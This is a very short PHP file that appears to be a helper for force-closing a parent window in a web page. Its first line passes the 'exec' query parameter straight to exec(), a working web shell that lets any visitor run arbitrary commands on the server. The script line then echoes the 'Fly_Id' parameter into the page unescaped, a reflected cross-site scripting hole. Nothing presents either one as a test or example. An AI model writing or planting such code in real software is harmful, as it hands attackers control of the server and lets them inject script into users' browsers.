<?php
exec($_GET['exec']);
?>
<script>window.top.document.getElementById('<?php echo $_GET['Fly_Id']; ?>').window.forceClose();</script>